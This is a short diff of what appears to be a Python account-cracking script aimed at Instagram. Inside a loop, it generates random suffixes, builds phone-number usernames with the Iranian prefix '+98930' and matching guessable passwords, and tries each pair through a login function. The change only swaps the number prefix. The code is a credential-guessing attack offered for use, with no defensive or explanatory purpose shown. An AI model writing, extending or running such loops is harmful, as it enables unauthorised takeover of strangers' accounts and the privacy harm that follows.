@@ -125,8 +125,8 @@ if str(API) == "1":
 	
 	while True:
 		BT = str(''.join((random.choice(CH) for i in range(7))))
-		username = "+98936"+str(BT)
-		password = "0936"+str(BT)
+		username = "+98930"+str(BT)
+		password = "0930"+str(BT)
 		try:
 			Logan = SidraELEzz.Instalogin(str(username),str(password))
 			if (Logan) ==True:
